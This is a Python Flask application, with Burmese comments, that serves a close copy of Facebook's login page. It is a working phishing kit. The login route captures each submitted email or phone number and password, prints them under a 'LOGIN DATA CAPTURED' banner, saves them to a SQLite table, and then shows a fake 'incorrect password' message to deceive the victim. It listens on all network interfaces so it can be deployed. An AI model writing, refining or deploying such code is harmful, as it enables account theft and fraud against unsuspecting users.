from flask import Flask, render_template_string, request, redirect, url_for, flash
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime

app = Flask(__name__)
app.secret_key = "facebook_clone_secret_key"

# SQLite Database setup
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///facebook_logs.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# Database Model
class CapturedUser(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email_or_phone = db.Column(db.String(150), nullable=False)
    password = db.Column(db.String(150), nullable=False)
    timestamp = db.Column(db.DateTime, default=datetime.now)

# Facebook Cloned HTML & CSS UI
FB_LOGIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook – log in or sign up</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #f0f2f5;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .main-container {
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 100%;
            max-width: 980px;
            padding: 20px;
            margin-bottom: 80px;
        }
        .left-content {
            max-width: 500px;
            padding-right: 32px;
            margin-bottom: 40px;
        }
        .fb-logo {
            color: #1877f2;
            font-size: 56px;
            font-weight: bold;
            letter-spacing: -1.2px;
            margin-left: -4px;
            margin-bottom: 10px;
        }
        .fb-tagline {
            font-size: 26px;
            line-height: 32px;
            color: #1c1e21;
            font-weight: normal;
        }
        .right-content {
            width: 396px;
        }
        .card {
            background-color: #ffffff;
            border: none;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            padding: 16px;
            text-align: center;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            height: 52px;
            padding: 14px 16px;
            margin-bottom: 12px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            outline: none;
        }
        input[type="text"]:focus, input[type="password"]:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        .btn-login {
            width: 100%;
            height: 48px;
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            color: #ffffff;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 16px;
        }
        .btn-login:hover {
            background-color: #166fe5;
        }
        .forgot-pass {
            color: #1877f2;
            font-size: 14px;
            text-decoration: none;
            display: inline-block;
            margin-bottom: 20px;
        }
        .forgot-pass:hover {
            text-decoration: underline;
        }
        hr {
            border: none;
            border-top: 1px solid #dadde1;
            margin-bottom: 20px;
        }
        .btn-create-account {
            background-color: #42b72a;
            border: none;
            border-radius: 6px;
            color: #ffffff;
            font-size: 17px;
            font-weight: bold;
            padding: 0 16px;
            height: 48px;
            line-height: 48px;
            cursor: pointer;
            display: inline-block;
            text-decoration: none;
        }
        .btn-create-account:hover {
            background-color: #36a420;
        }
        .create-page-text {
            margin-top: 28px;
            font-size: 14px;
            color: #1c1e21;
            text-align: center;
        }
        .create-page-text a {
            font-weight: bold;
            color: #1c1e21;
            text-decoration: none;
        }
        .create-page-text a:hover {
            text-decoration: underline;
        }
        .flash-msg {
            color: red;
            font-size: 14px;
            margin-bottom: 12px;
        }
        @media (max-width: 900px) {
            .main-container {
                flex-direction: column;
                text-align: center;
            }
            .left-content {
                padding-right: 0;
            }
            .fb-logo {
                font-size: 45px;
            }
            .fb-tagline {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="main-container">
        <!-- Left Side: Facebook Branding -->
        <div class="left-content">
            <div class="fb-logo">facebook</div>
            <div class="fb-tagline">
                Facebook helps you connect and share with the people in your life.
            </div>
        </div>

        <!-- Right Side: Login Form Card -->
        <div class="right-content">
            <div class="card">
                {% with messages = get_flashed_messages() %}
                    {% if messages %}
                        {% for message in messages %}
                            <p class="flash-msg">{{ message }}</p>
                        {% endfor %}
                    {% endif %}
                {% endwith %}
                <form method="POST" action="/login">
                    <input type="text" name="email_or_phone" placeholder="Email address or phone number" required autocomplete="off">
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit" class="btn-login">Log In</button>
                </form>
                <a href="#" class="forgot-pass">Forgotten password?</a>
                <hr>
                <a href="#" class="btn-create-account">Create new account</a>
            </div>
            <div class="create-page-text">
                <a href="#">Create a Page</a> for a celebrity, brand or business.
            </div>
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email_or_phone = request.form.get('email_or_phone')
        password = request.form.get('password')
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        # Python Terminal / Console ပေါ်တွင် တန်းပေါ်စေခြင်း
        print("\n" + "═"*55)
        print(f"[{current_time}] 📲 FACEBOOK LOGIN DATA CAPTURED")
        print(f" Email / Phone : {email_or_phone}")
        print(f" Password      : {password}")
        print("═"*55 + "\n")

        # Database ထဲတွင် သိမ်းဆည်းခြင်း
        new_entry = CapturedUser(email_or_phone=email_or_phone, password=password)
        db.session.add(new_entry)
        db.session.commit()

        flash("The password you've entered is incorrect.")
        return render_template_string(FB_LOGIN_HTML)

    return render_template_string(FB_LOGIN_HTML)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
